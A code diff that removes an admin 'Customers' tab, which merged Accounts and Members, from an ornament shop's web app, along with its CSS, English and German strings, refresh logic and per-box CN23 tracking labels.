@@ -2779,156 +2779,6 @@ body.pre-launch-mode .product-table tbody tr:hover { background: inherit; }
 .member-status-badge-banned   { background: rgba(180, 30, 30, 0.20);  color: #e07070; }
 .member-status-badge-other    { background: rgba(201, 168, 76, 0.15); color: var(--gold-ink); }
 
-/* ── PHASE 7.16: CUSTOMERS TAB (merged Accounts + Members) ── */
-/* Same row compression the Members tab uses. Nine columns need it more. */
-#adminCustomers .admin-table th,
-#adminCustomers .admin-table td {
-  padding: 8px 10px;
-  vertical-align: top;
-}
-/* Roster status tints. The Members tab scopes these to its own container, so
-   the Customers table needs its own copy rather than inheriting them. */
-#adminCustomers tr.member-status-banned td {
-  background: rgba(180, 30, 30, 0.08) !important;
-  color: #c66;
-}
-#adminCustomers tr.member-status-inactive td { opacity: 0.55; }
-
-/* Which of the two lists a person came from. */
-.customer-kind-chip {
-  display: inline-block;
-  padding: 1px 6px;
-  border-radius: 3px;
-  font-size: 9px;
-  font-family: 'DM Mono', monospace;
-  letter-spacing: 0.8px;
-  text-transform: uppercase;
-  vertical-align: middle;
-}
-.customer-kind-both    { background: rgba(201,168,76,0.18); color: var(--gold-ink); }
-/* Who can also get into the admin panel. Deliberately louder than the kind
-   chip: it is a permission, not a category. */
-.customer-admin-chip,
-.customer-owner-chip {
-  display: inline-block;
-  padding: 1px 6px;
-  margin-left: 4px;
-  border-radius: 3px;
-  font-size: 9px;
-  font-family: 'DM Mono', monospace;
-  letter-spacing: 0.8px;
-  text-transform: uppercase;
-  vertical-align: middle;
-}
-.customer-admin-chip { background: rgba(139,42,42,0.14); color: #8b2a2a; border: 1px solid rgba(139,42,42,0.30); }
-.customer-owner-chip { background: rgba(176,141,64,0.20); color: var(--gold-ink); border: 1px solid rgba(176,141,64,0.45); }
-.customer-kind-account { background: rgba(60,130,70,0.14);  color: #3f7a4e; }
-.customer-kind-roster  { background: rgba(120,120,140,0.16); color: var(--cream-dim); }
-
-.customer-banned-chip,
-.customer-unlimited-chip,
-.customer-noaccount-chip,
-.customer-validated-chip {
-  display: inline-block;
-  padding: 2px 6px;
-  font-size: 10px;
-  border-radius: 3px;
-  font-family: 'DM Mono', monospace;
-  vertical-align: middle;
-}
-.customer-banned-chip    { background: rgba(139,42,42,0.15);  color: #8b2a2a; }
-.customer-unlimited-chip { background: rgba(201,168,76,0.15); color: var(--gold-ink); }
-.customer-noaccount-chip { background: rgba(120,120,140,0.12); color: var(--cream-dim); font-style: italic; }
-.customer-validated-chip { background: rgba(30,77,48,0.12);   color: #2a5535; }
-
-/* The website and the Facebook roster disagree about this person. Not an
-   error — the two have always been independent — but worth seeing. */
-.customer-conflict {
-  margin-top: 4px;
-  font-size: 10px;
-  color: #a8642a;
-  font-family: 'DM Mono', monospace;
-  cursor: help;
-  border-bottom: 1px dotted rgba(168,100,42,0.5);
-  display: inline-block;
-}
-.customer-warn-note      { font-size: 10px; color: #a8642a; font-family: 'DM Mono', monospace; margin-top: 4px; cursor: help; }
-.customer-validated-note { font-size: 10px; color: #2a5535; font-family: 'DM Mono', monospace; margin-top: 4px; }
-.customer-note-marker    { font-size: 10px; color: var(--cream-dim); font-family: 'DM Mono', monospace; margin-top: 4px; cursor: help; }
-
-/* Profile view sections */
-.customer-section {
-  margin-bottom: 22px;
-  padding-bottom: 18px;
-  border-bottom: 1px solid var(--line2);
-}
-.customer-section:last-child { border-bottom: none; }
-.customer-section-title {
-  margin: 0 0 12px;
-  font-family: 'Cinzel', serif;
-  color: var(--gold-ink);
-  font-size: 12px;
-  letter-spacing: 2px;
-  text-transform: uppercase;
-}
-.customer-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-  gap: 12px;
-}
-/* A proposed pairing, offered for a yes or no rather than applied. */
-.customer-candidate {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 12px;
-  padding: 8px 10px;
-  border: 1px solid var(--line2);
-  border-radius: var(--r);
-  margin-bottom: 6px;
-}
-.customer-candidate-conf {
-  font-size: 10px;
-  font-family: 'DM Mono', monospace;
-  color: var(--gold-ink);
-  margin-top: 2px;
-}
-.customer-section-sub {
-  font-size: 11px;
-  color: var(--cream-dim);
-  text-transform: uppercase;
-  letter-spacing: 1.5px;
-  margin-bottom: 8px;
-}
-/* Reassurance sits next to the button, not in a manual nobody reads. */
-.customer-safe-note {
-  font-size: 11px;
-  color: var(--cream-dim);
-  font-style: italic;
-  margin: 10px 0 0;
-  line-height: 1.5;
-}
-.customer-orders-table tbody tr.customer-order-cancelled td {
-  opacity: 0.5;
-  text-decoration: line-through;
-}
-
-/* Nine columns need help below a full-width admin panel. The Notes column
-   folds away first: every marker in it (flags, email mismatch, validated, the
-   comment preview) is repeated in full inside the profile view, so nothing
-   becomes unreachable. Both date columns stay, by decision - they answer
-   different questions. Narrower than that the table scrolls sideways inside
-   .admin-table-wrap rather than clipping. */
-@media (max-width: 1100px) {
-  #adminCustomers .cust-col-notes { display: none; }
-}
-/* .cust-col-since carries no rule of its own. It marks the two date columns so
-   a future responsive pass has a handle on them without re-deriving which
-   cells they are. */
-@media (max-width: 1000px) {
-  #adminCustomers .customers-table { min-width: 900px; }
-}
-
 /* Search + filter bar */
 .member-search-bar {
   display: flex;
@@ -3487,19 +3337,14 @@ body.pre-launch-mode .product-table tbody tr:hover { background: inherit; }
    Pins the header below the 64px-tall topbar so customers can keep scrolling
    long lists while still seeing column labels. Vault is intentionally excluded
    (it has its own scroll/sticky behavior). */
-#adminAccounts  .admin-table thead th,
-#adminOrders    .admin-table thead th,
-#adminMembers   .admin-table thead th,
-#adminCustomers .admin-table thead th {
+#adminAccounts .admin-table thead th,
+#adminOrders   .admin-table thead th,
+#adminMembers  .admin-table thead th {
   position: sticky;
   top: 64px;
   z-index: 5;
   background: var(--chrome);
 }
-/* Phase 7.16: the order-history table sits INSIDE the Customers panel, so the
-   rule above would pin its header to the topbar as well and float it over the
-   sections below. It scrolls with the profile instead. */
-#adminCustomers .customer-orders-table thead th { position: static; }
 
 /* Phase 7.9: the "To Make" column is the operational headline of the report,
    so it is weighted to be scannable down the page next to Total Ordered. */
@@ -5366,14 +5211,6 @@ body.locked > *:not(#constructionGate) { display: none !important; }
              window is normal/open. -->
         <div id="adminStickyBanner" style="display:none"></div>
         <div style="display:flex; gap:8px; margin-bottom:24px; flex-wrap:wrap">
-          <!-- Phase 7.16: Customers merges Accounts + Members. Accounts and Members
-               stay in place, and stay the default landing tab, until the
-               phase7.16 migration has been applied and the new tab verified
-               against live data. Flipping the default is a one-line change:
-               give this button btn-outline, give Accounts btn-ghost, add
-               style="display:none" to #adminAccounts, remove it from
-               #adminCustomers, and set ADMIN_CURRENT_TAB to 'customers'. -->
-          <button class="btn btn-ghost btn-sm" onclick="adminTab('customers')" id="adminTabCustomers" data-t="admin_tab_customers"></button>
           <button class="btn btn-outline btn-sm" onclick="adminTab('accounts')" id="adminTabAccounts" data-t="admin_accounts"></button>
           <button class="btn btn-ghost btn-sm" onclick="adminTab('orders')" id="adminTabOrders" data-t="admin_orders"></button>
           <button class="btn btn-ghost btn-sm" onclick="adminTab('history')" id="adminTabHistory" data-t="admin_history"></button>
@@ -5387,7 +5224,6 @@ body.locked > *:not(#constructionGate) { display: none !important; }
           <button class="btn btn-ghost btn-sm" onclick="adminTab('lottery')" id="adminTabLottery" data-t="admin_lottery"></button>
           <button class="btn btn-ghost btn-sm" onclick="adminTab('admins')" id="adminTabAdmins" data-t="admin_tab_admins" style="display:none"></button>
         </div>
-        <div id="adminCustomers" style="display:none"></div>
         <div id="adminAccounts"></div>
         <div id="adminOrders" style="display:none"></div>
         <div id="adminHistory" style="display:none"></div>
@@ -7773,11 +7609,7 @@ const T = {
     // Phase 7.15: asked at print time, because the CN23 is prepared before the
     // parcel is handed over and the order is not shipped yet.
     cn23_tracking_prompt: "Sendungsnummer for this parcel.\n\nIt is printed in the Sendungsnummer box and saved on the order, so it is already filled in when you mark the order shipped.\n\nLeave blank to print an empty box and write the number on by hand.",
-    // Phase 7.15b: each box is its own parcel with its own CN23 and its own
-    // number, so a multi-box order is asked once per box.
-    cn23_tracking_prompt_box: "Sendungsnummer for BOX {n} of {total}.\n\nEach box travels as its own parcel, so each one gets its own number on its own CN23. The number for box 1 is the one the customer's shipping email links to.\n\nLeave blank to print an empty box and write it on by hand. Cancel to stop being asked for the remaining boxes.",
     cn23_tracking_save_failed: "The tracking number could not be saved to the order: {msg}\n\nIt is still printed on this CN23, but you will have to type it again when you mark the order shipped.",
-    cn23_tracking_save_blocked: "the database accepted the request but wrote nothing, which is a permissions problem rather than a typing mistake",
     cn23_setting_phone: "Sender phone",
     cn23_setting_phone_hint: "Printed on the CN23 so customs can reach you about a parcel instead of returning it. Include the country code.",
     customs_origin_fixed_hint: "Fixed. Every ornament is hand-blown in Lauscha, so the invoice, the customs document and the CN23 all declare Germany. Making this editable would let two documents in the same envelope disagree.",
@@ -7802,9 +7634,6 @@ const T = {
     customs_contents_weight: "Contents weight",
     customs_box_weight: "Box weight (empty)",
     customs_box_total: "Box total",
-    // Phase 7.15b: one CN23 per box means one tracking number per box.
-    customs_box_tracking: "Tracking (Sendungsnummer)",
-    customs_box_tracking_ph: "Number for this box",
     customs_shipped_weight: "Shipped weight (with boxes)",
     customs_contents_manual: "manual, calculated {n}g",
     customs_follow_items: "follow item weights",
@@ -8113,112 +7942,6 @@ admin_members_advanced_show: 'Show advanced (internal sort dates)',
   admin_members_advanced_hide: 'Hide advanced',
   admin_members_advanced_help: 'These dates are used internally for sorting and may be auto-populated from the labels above.',
   admin_members_internal_sort_date: 'Internal sort date',
-  // ── Phase 7.16: Customers tab (merges Accounts + Members) ──
-  admin_tab_customers: 'Customers',
-  admin_customers_db_unavailable: 'Database unavailable.',
-  admin_customers_load_failed: 'Could not load customers. Nothing has been changed or lost. This is a query error, not missing data.',
-  admin_customers_search_ph: 'Search name, email, Facebook name, notes…',
-  admin_customers_no_matches: 'No customers match your search.',
-  admin_customers_open: 'Open',
-  admin_customers_back: '← Back to customers',
-  admin_customers_save: 'Save',
-  // list columns
-  admin_customers_col_customer: 'Customer',
-  admin_customers_col_standing: 'Standing',
-  admin_customers_col_member_since: 'Member since',
-  admin_customers_col_joined_site: 'Joined site',
-  admin_customers_col_orders: 'Orders',
-  admin_customers_col_notes: 'Notes',
-  // what kind of record this person is
-  admin_customers_role_admin: 'Admin',
-  admin_customers_role_owner: 'Owner',
-  admin_customers_profile_load_failed: "Couldn't load {name}'s full record. Nothing has been changed. Their account, roster entry and orders are all safe in the database - this is a read error, not missing data.",
-  admin_customers_retry: 'Try again',
-  admin_customers_suggested: 'Likely the same person',
-  admin_customers_no_suggestions: 'No likely match found by name. Search below if you know who this is.',
-  admin_customers_conf_fb: 'Facebook name matches',
-  admin_customers_conf_name: 'Name matches',
-  admin_customers_conf_firstlast: 'First and last name match',
-  admin_customers_conf_manual: 'Found by search',
-  admin_customers_link_roster_search_ph: 'Search roster entries by name…',
-  admin_customers_link_safe: 'Linking only connects the two records. No account, order or roster entry is changed or deleted, and Unlink puts them back exactly as they were.',
-  admin_customers_restore_before_link: 'Restore this roster entry before linking it to an account.',
-  admin_customers_kind_both: 'Linked',
-  admin_customers_kind_account: 'Account',
-  admin_customers_kind_roster: 'Roster',
-  admin_customers_filter_kind_all: 'Everyone',
-  admin_customers_filter_account_only: 'Account only',
-  admin_customers_filter_roster_only: 'Roster only',
-  admin_customers_filter_status_all: 'Any account status',
-  admin_customers_filter_roster_all: 'Any roster status',
-  admin_customers_filter_fb_all: 'Any FB group state',
-  admin_customers_no_account: 'No account',
-  admin_customers_not_on_roster: 'Not on roster',
-  admin_customers_fb_prefix: 'FB group:',
-  admin_customers_roster_name_prefix: 'roster:',
-  // the website and the roster disagree
-  admin_customers_conflict: 'Standing conflict',
-  admin_customers_conflict_banned_roster: 'Approved to order on the site, but marked Banned on the Facebook roster. The roster does not block ordering, so if they should be blocked, ban the account.',
-  admin_customers_conflict_left_group: 'Approved to order on the site, but no longer recorded as being in the Facebook group.',
-  admin_customers_conflict_banned_active: 'Blocked from the site, but still marked Active on the Facebook roster.',
-  admin_customers_email_mismatch: 'The roster entry has a different email from the linked account. The account email is the one that matters for login and orders.',
-  admin_customers_email_mismatch_short: 'Email differs',
-  admin_customers_validated_short: 'Validated',
-  admin_customers_has_notes: 'Notes',
-  // profile sections
-  admin_customers_sec_identity: 'Identity and contact',
-  admin_customers_sec_address: 'Address',
-  admin_customers_sec_account: 'Website account',
-  admin_customers_sec_roster: 'Facebook roster',
-  admin_customers_sec_notes: 'Notes',
-  admin_customers_sec_orders: 'Order history',
-  admin_customers_sec_provenance: 'Record history',
-  admin_customers_identity_roster_only: 'This person has no website account, so there is no contact record to edit. Link them to an account below, or keep their details on the roster entry.',
-  admin_customers_no_account_hint: 'This person is on the roster but has no website account, so they cannot place an order online.',
-  admin_customers_not_on_roster_hint: 'This person has a website account but no Facebook roster entry, so there is nowhere to keep notes or a membership date for them.',
-  admin_customers_add_roster_for: 'Add a roster entry for them',
-  admin_customers_notes_need_roster: 'Notes live on the roster entry. Add one in the Facebook roster section above to start keeping notes on this person.',
-  admin_customers_roster_email: 'Roster email',
-  admin_customers_last_order_from_orders: 'Taken from their real orders. Not editable for someone with an account.',
-  admin_customers_account_id: 'Account ID',
-  admin_customers_ban_label: 'Site ban',
-  admin_customers_created_by: 'Roster entry created by',
-  admin_customers_deleted_by: 'Roster entry deleted by',
-  admin_customers_danger: 'Destructive actions',
-  admin_customers_danger_hint: 'Deleting the roster entry keeps the website account and every order. Deleting the account removes the login and all of its orders permanently.',
-  admin_customers_delete_roster: 'Delete roster entry',
-  admin_customers_delete_account: 'Delete account',
-  // linking
-  admin_customers_link_search_ph: 'Search accounts by name or email…',
-  admin_customers_link_none: 'No accounts match.',
-  admin_customers_link_btn: 'Link',
-  admin_customers_link_confirm: 'Link this roster entry to that account? Their order history will appear here, and the last-order date will come from real orders instead of the typed one.',
-  admin_customers_unlink: 'Unlink roster entry from this account',
-  admin_customers_unlink_confirm: 'Unlink the roster entry from this account? Both records stay, but they stop being treated as the same person.',
-  admin_customers_add_roster: 'Add roster entry',
-  admin_customers_add_roster_prompt: 'Name of the person to add to the Facebook roster:',
-  admin_customers_no_session: 'Could not determine your email. Please log out and back in.',
-  admin_customers_mass_delete_roster: 'Delete all roster entries',
-  admin_customers_empty_trash: 'Empty roster trash',
-  // order history
-  admin_customers_orders_loading: 'Loading order history…',
-  admin_customers_orders_none: 'No orders yet.',
-  admin_customers_orders_no_account: 'No website account, so there are no online orders to show. Anything bought in person is recorded on the roster entry instead.',
-  admin_customers_orders_load_failed: "Couldn't load this customer's orders. Their orders are safe in the database. This is a temporary query error, not deleted data.",
-  admin_customers_orders_live: 'Orders',
-  admin_customers_orders_units: 'Ornaments',
-  admin_customers_orders_value: 'Total value',
-  admin_customers_orders_cancelled_excluded: 'Cancelled orders are listed but not counted in these totals.',
-  admin_customers_order_open: 'Open in Orders',
-  admin_customers_col_order: 'Order',
-  admin_customers_col_date: 'Placed',
-  admin_customers_col_items: 'Items',
-  admin_customers_gift_short: '(gift)',
-  admin_customers_restore_before_link: 'This roster entry is in the trash. Restore it first if you want to change which account it belongs to.',
-  admin_customers_export_roster_active: 'Export roster (active)',
-  admin_customers_export_roster_all: 'Export roster (all)',
-  admin_customers_export_roster_note: 'Exports Facebook roster entries only, not account-only customers.',
-  admin_customers_link_taken: 'Another roster entry already belongs to that account. It may be in the trash - turn on Show deleted to find it, then restore it instead of creating a second one.',
 // ── Phase 6.38.1: Vault tab ──
   admin_tab_vault: 'Vault',
   admin_vault_title: 'Vault',
@@ -9195,11 +8918,7 @@ admin_lottery: "Lottery",
     // Phase 7.15: wird beim Drucken abgefragt, weil die CN23 vor der Übergabe
     // der Sendung erstellt wird und die Bestellung noch nicht versandt ist.
     cn23_tracking_prompt: "Sendungsnummer für diese Sendung.\n\nSie wird in das Feld Sendungsnummer gedruckt und bei der Bestellung gespeichert, sodass sie beim Setzen auf Versandt bereits eingetragen ist.\n\nLeer lassen, um das Feld frei zu drucken und die Nummer von Hand einzutragen.",
-    // Phase 7.15b: jeder Karton ist eine eigene Sendung mit eigener CN23 und
-    // eigener Nummer, daher wird pro Karton einmal gefragt.
-    cn23_tracking_prompt_box: "Sendungsnummer für KARTON {n} von {total}.\n\nJeder Karton geht als eigene Sendung, also bekommt jeder seine eigene Nummer auf seiner eigenen CN23. Die Nummer von Karton 1 ist die, auf die die Versand-E-Mail an den Kunden verlinkt.\n\nLeer lassen, um das Feld frei zu drucken und die Nummer von Hand einzutragen. Abbrechen, um nicht nach den restlichen Kartons gefragt zu werden.",
     cn23_tracking_save_failed: "Die Sendungsnummer konnte nicht bei der Bestellung gespeichert werden: {msg}\n\nSie wird trotzdem auf diese CN23 gedruckt, muss aber beim Setzen auf Versandt erneut eingegeben werden.",
-    cn23_tracking_save_blocked: "die Datenbank hat die Anfrage angenommen, aber nichts geschrieben - das ist ein Berechtigungsproblem, kein Tippfehler",
     cn23_setting_phone: "Telefon Absender",
     cn23_setting_phone_hint: "Wird auf der CN23 gedruckt, damit der Zoll Sie bei Rückfragen erreichen kann, statt die Sendung zurückzuschicken. Mit Ländervorwahl.",
     customs_origin_fixed_hint: "Fest eingestellt. Jedes Ornament wird in Lauscha geblasen, daher deklarieren Rechnung, Zolldokument und CN23 einheitlich Germany. Wäre dies änderbar, könnten zwei Dokumente in derselben Sendung voneinander abweichen.",
@@ -9224,9 +8943,6 @@ admin_lottery: "Lottery",
     customs_contents_weight: "Inhaltsgewicht",
     customs_box_weight: "Kartongewicht (leer)",
     customs_box_total: "Gesamt pro Karton",
-    // Phase 7.15b: eine CN23 pro Karton, also eine Sendungsnummer pro Karton.
-    customs_box_tracking: "Sendungsnummer",
-    customs_box_tracking_ph: "Nummer für diesen Karton",
     customs_shipped_weight: "Versandgewicht (mit Kartons)",
     customs_contents_manual: "manuell, berechnet {n}g",
     customs_follow_items: "Einzelgewichten folgen",
@@ -9495,106 +9211,6 @@ admin_members_advanced_show: 'Erweitert anzeigen (interne Sortier-Daten)',
   admin_members_advanced_hide: 'Erweitert ausblenden',
   admin_members_advanced_help: 'Diese Daten werden intern zur Sortierung verwendet und können aus den Labels oben automatisch befüllt werden.',
   admin_members_internal_sort_date: 'Internes Sortier-Datum',  
-  // ── Phase 7.16: Kunden-Tab (fasst Konten + Mitglieder zusammen) ──
-  admin_tab_customers: 'Kunden',
-  admin_customers_db_unavailable: 'Datenbank nicht verfügbar.',
-  admin_customers_load_failed: 'Kunden konnten nicht geladen werden. Es wurde nichts geändert oder verloren. Dies ist ein Abfragefehler, keine fehlenden Daten.',
-  admin_customers_search_ph: 'Name, E-Mail, Facebook-Name, Notizen durchsuchen…',
-  admin_customers_no_matches: 'Keine Kunden entsprechen Ihrer Suche.',
-  admin_customers_open: 'Öffnen',
-  admin_customers_back: '← Zurück zur Kundenliste',
-  admin_customers_save: 'Speichern',
-  admin_customers_col_customer: 'Kunde',
-  admin_customers_col_standing: 'Status',
-  admin_customers_col_member_since: 'Mitglied seit',
-  admin_customers_col_joined_site: 'Website-Beitritt',
-  admin_customers_col_orders: 'Bestellungen',
-  admin_customers_col_notes: 'Notizen',
-  admin_customers_role_admin: 'Admin',
-  admin_customers_role_owner: 'Inhaber',
-  admin_customers_profile_load_failed: 'Der vollständige Datensatz von {name} konnte nicht geladen werden. Es wurde nichts geändert. Konto, Listeneintrag und Bestellungen sind in der Datenbank sicher - dies ist ein Lesefehler, keine fehlenden Daten.',
-  admin_customers_retry: 'Erneut versuchen',
-  admin_customers_suggested: 'Wahrscheinlich dieselbe Person',
-  admin_customers_no_suggestions: 'Keine wahrscheinliche Namensübereinstimmung gefunden. Suchen Sie unten, wenn Sie wissen, wer das ist.',
-  admin_customers_conf_fb: 'Facebook-Name stimmt überein',
-  admin_customers_conf_name: 'Name stimmt überein',
-  admin_customers_conf_firstlast: 'Vor- und Nachname stimmen überein',
-  admin_customers_conf_manual: 'Über die Suche gefunden',
-  admin_customers_link_roster_search_ph: 'Listeneinträge nach Namen suchen…',
-  admin_customers_link_safe: 'Das Verknüpfen verbindet nur die beiden Datensätze. Kein Konto, keine Bestellung und kein Listeneintrag wird geändert oder gelöscht, und Trennen stellt den vorherigen Zustand exakt wieder her.',
-  admin_customers_restore_before_link: 'Stellen Sie diesen Listeneintrag wieder her, bevor Sie ihn mit einem Konto verknüpfen.',
-  admin_customers_kind_both: 'Verknüpft',
-  admin_customers_kind_account: 'Konto',
-  admin_customers_kind_roster: 'Liste',
-  admin_customers_filter_kind_all: 'Alle Personen',
-  admin_customers_filter_account_only: 'Nur Konto',
-  admin_customers_filter_roster_only: 'Nur Liste',
-  admin_customers_filter_status_all: 'Beliebiger Kontostatus',
-  admin_customers_filter_roster_all: 'Beliebiger Listenstatus',
-  admin_customers_filter_fb_all: 'Beliebiger FB-Gruppenstatus',
-  admin_customers_no_account: 'Kein Konto',
-  admin_customers_not_on_roster: 'Nicht auf der Liste',
-  admin_customers_fb_prefix: 'FB-Gruppe:',
-  admin_customers_roster_name_prefix: 'Liste:',
-  admin_customers_conflict: 'Status-Widerspruch',
-  admin_customers_conflict_banned_roster: 'Auf der Website zum Bestellen freigegeben, auf der Facebook-Liste aber als Gesperrt markiert. Die Liste blockiert das Bestellen nicht, wenn die Person also blockiert werden soll, sperren Sie das Konto.',
-  admin_customers_conflict_left_group: 'Auf der Website zum Bestellen freigegeben, aber nicht mehr als Mitglied der Facebook-Gruppe erfasst.',
-  admin_customers_conflict_banned_active: 'Auf der Website blockiert, auf der Facebook-Liste aber weiterhin als Aktiv markiert.',
-  admin_customers_email_mismatch: 'Der Listeneintrag hat eine andere E-Mail-Adresse als das verknüpfte Konto. Für Anmeldung und Bestellungen zählt die Konto-Adresse.',
-  admin_customers_email_mismatch_short: 'E-Mail weicht ab',
-  admin_customers_validated_short: 'Validiert',
-  admin_customers_has_notes: 'Notizen',
-  admin_customers_sec_identity: 'Identität und Kontakt',
-  admin_customers_sec_address: 'Adresse',
-  admin_customers_sec_account: 'Website-Konto',
-  admin_customers_sec_roster: 'Facebook-Liste',
-  admin_customers_sec_notes: 'Notizen',
-  admin_customers_sec_orders: 'Bestellverlauf',
-  admin_customers_sec_provenance: 'Datensatz-Verlauf',
-  admin_customers_identity_roster_only: 'Diese Person hat kein Website-Konto, daher gibt es keinen Kontaktdatensatz zum Bearbeiten. Verknüpfen Sie sie unten mit einem Konto oder pflegen Sie die Angaben im Listeneintrag.',
-  admin_customers_no_account_hint: 'Diese Person steht auf der Liste, hat aber kein Website-Konto und kann daher nicht online bestellen.',
-  admin_customers_not_on_roster_hint: 'Diese Person hat ein Website-Konto, aber keinen Facebook-Listeneintrag, es gibt also keinen Ort für Notizen oder ein Mitgliedsdatum.',
-  admin_customers_add_roster_for: 'Listeneintrag für diese Person anlegen',
-  admin_customers_notes_need_roster: 'Notizen gehören zum Listeneintrag. Legen Sie oben im Bereich Facebook-Liste einen an, um Notizen zu dieser Person zu führen.',
-  admin_customers_roster_email: 'E-Mail auf der Liste',
-  admin_customers_last_order_from_orders: 'Wird aus den echten Bestellungen übernommen. Für Personen mit Konto nicht bearbeitbar.',
-  admin_customers_account_id: 'Konto-ID',
-  admin_customers_ban_label: 'Website-Sperre',
-  admin_customers_created_by: 'Listeneintrag erstellt von',
-  admin_customers_deleted_by: 'Listeneintrag gelöscht von',
-  admin_customers_danger: 'Unwiderrufliche Aktionen',
-  admin_customers_danger_hint: 'Das Löschen des Listeneintrags lässt das Website-Konto und alle Bestellungen unberührt. Das Löschen des Kontos entfernt die Anmeldung und alle zugehörigen Bestellungen endgültig.',
-  admin_customers_delete_roster: 'Listeneintrag löschen',
-  admin_customers_delete_account: 'Konto löschen',
-  admin_customers_link_search_ph: 'Konten nach Name oder E-Mail suchen…',
-  admin_customers_link_none: 'Keine passenden Konten.',
-  admin_customers_link_btn: 'Verknüpfen',
-  admin_customers_link_confirm: 'Diesen Listeneintrag mit dem Konto verknüpfen? Der Bestellverlauf erscheint dann hier, und das Datum der letzten Bestellung kommt aus echten Bestellungen statt aus dem eingetippten Wert.',
-  admin_customers_unlink: 'Listeneintrag vom Konto trennen',
-  admin_customers_unlink_confirm: 'Den Listeneintrag von diesem Konto trennen? Beide Datensätze bleiben bestehen, gelten aber nicht mehr als dieselbe Person.',
-  admin_customers_add_roster: 'Listeneintrag hinzufügen',
-  admin_customers_add_roster_prompt: 'Name der Person, die zur Facebook-Liste hinzugefügt werden soll:',
-  admin_customers_no_session: 'Ihre E-Mail-Adresse konnte nicht ermittelt werden. Bitte melden Sie sich ab und wieder an.',
-  admin_customers_mass_delete_roster: 'Alle Listeneinträge löschen',
-  admin_customers_empty_trash: 'Listen-Papierkorb leeren',
-  admin_customers_orders_loading: 'Bestellverlauf wird geladen…',
-  admin_customers_orders_none: 'Noch keine Bestellungen.',
-  admin_customers_orders_no_account: 'Kein Website-Konto, daher gibt es keine Online-Bestellungen. Was persönlich gekauft wurde, steht stattdessen im Listeneintrag.',
-  admin_customers_orders_load_failed: 'Die Bestellungen dieses Kunden konnten nicht geladen werden. Die Bestellungen sind in der Datenbank sicher. Dies ist ein vorübergehender Abfragefehler, keine gelöschten Daten.',
-  admin_customers_orders_live: 'Bestellungen',
-  admin_customers_orders_units: 'Ornamente',
-  admin_customers_orders_value: 'Gesamtwert',
-  admin_customers_orders_cancelled_excluded: 'Stornierte Bestellungen werden aufgeführt, aber nicht in diese Summen eingerechnet.',
-  admin_customers_order_open: 'In Bestellungen öffnen',
-  admin_customers_col_order: 'Bestellung',
-  admin_customers_col_date: 'Aufgegeben',
-  admin_customers_col_items: 'Artikel',
-  admin_customers_gift_short: '(Geschenk)',
-  admin_customers_restore_before_link: 'Dieser Listeneintrag liegt im Papierkorb. Stellen Sie ihn zuerst wieder her, wenn Sie die Kontozuordnung ändern möchten.',
-  admin_customers_export_roster_active: 'Liste exportieren (aktiv)',
-  admin_customers_export_roster_all: 'Liste exportieren (alle)',
-  admin_customers_export_roster_note: 'Exportiert nur Facebook-Listeneinträge, keine reinen Konto-Kunden.',
-  admin_customers_link_taken: 'Ein anderer Listeneintrag gehört bereits zu diesem Konto. Er liegt möglicherweise im Papierkorb - schalten Sie Gelöschte anzeigen ein, um ihn zu finden, und stellen Sie ihn wieder her, statt einen zweiten anzulegen.',
 // ── Phase 6.38.1: Vault tab ──
   admin_tab_vault: 'Tresor',
   admin_vault_title: 'Tresor',
@@ -10504,17 +10120,6 @@ function applyT() {
     renderAdminOrders();
   }
   // Same consideration for admin accounts table.
-  // Phase 7.16: the Customers table interpolates its column headers and filter
-  // option labels through t() at render time (they are not data-t nodes), so a
-  // language switch has to rebuild it. Guarded on the tab actually being the
-  // current one, not merely on style.display, because #adminCustomers can be
-  // display:'' before adminTab() has ever run.
-  const adminCustomersEl = document.getElementById('adminCustomers');
-  if (adminCustomersEl && ADMIN_CURRENT_TAB === 'customers' && adminCustomersEl.offsetParent !== null
-      && currentUser && isAdminEmail(currentUser.email) && typeof renderAdminCustomers === 'function') {
-    _customersState._useCache = true;   // re-render only; no need to re-query
-    renderAdminCustomers();
-  }
   const adminAccountsEl = document.getElementById('adminAccounts');
   if (adminAccountsEl && adminAccountsEl.style.display !== 'none' && currentUser && isAdminEmail(currentUser.email) && typeof renderAdminAccounts === 'function') {
     renderAdminAccounts();
@@ -12560,7 +12165,7 @@ async function renderHistory() {
 // ════════════════════════════════════════════════════════════════════
 var ADMIN_CURRENT_TAB = 'accounts';
 var ADMIN_REFRESH = { timer: null, seen: {}, wired: false };
-var ADMIN_REFRESH_TABS = ['accounts', 'customers', 'orders', 'products', 'vault', 'reports', 'members', 'schedule'];
+var ADMIN_REFRESH_TABS = ['accounts', 'orders', 'products', 'vault', 'reports', 'members', 'schedule'];
 function _arHash(s){ var h=5381,i=s.length; while(i){ h=(h*33)^s.charCodeAt(--i); } return (h>>>0).toString(36); }
 
 async function adminTableSignature(tab) {
@@ -12569,18 +12174,6 @@ async function adminTableSignature(tab) {
       const { count } = await sb.from('profiles').select('id', { count: 'exact', head: true });
       const { data } = await sb.from('profiles').select('created_at').order('created_at', { ascending: false }).limit(1);
       return 'p:' + count + '|' + ((data && data[0]) ? data[0].created_at : '');
-    }
-    if (tab === 'customers') {
-      // Phase 7.16: four head counts, not a full dump of the view. The Members
-      // branch below hashes every row on a 30s timer, which grows linearly with
-      // the roster; this catches signups, roster adds, deletes and restores for
-      // the price of four counts. Like the accounts branch, it does not notice
-      // in-place edits.
-      const pc = await sb.from('profiles').select('id', { count: 'exact', head: true });
-      const pn = await sb.from('profiles').select('created_at').order('created_at', { ascending: false }).limit(1);
-      const mc = await sb.from('members').select('id', { count: 'exact', head: true }).is('deleted_at', null);
-      const md = await sb.from('members').select('id', { count: 'exact', head: true }).not('deleted_at', 'is', null);
-      return 'c:' + pc.count + '|' + ((pn.data && pn.data[0]) ? pn.data[0].created_at : '') + '|' + mc.count + '|' + md.count;
     }
     if (tab === 'orders') {
       const { count } = await sb.from('orders').select('id', { count: 'exact', head: true });
@@ -12642,8 +12235,7 @@ async function adminRefreshNow() {
   var tab = ADMIN_CURRENT_TAB;
   hideAdminRefreshPill();
   try {
-    if (tab === 'customers' && typeof renderAdminCustomers === 'function') { _customersState._useCache = false; await renderAdminCustomers(); }
-    else if (tab === 'accounts' && typeof renderAdminAccounts === 'function') await renderAdminAccounts();
+    if (tab === 'accounts' && typeof renderAdminAccounts === 'function') await renderAdminAccounts();
     else if (tab === 'orders' && typeof renderAdminOrders === 'function') await renderAdminOrders();
     else if (tab === 'products' && typeof renderAdminProducts === 'function') await renderAdminProducts();
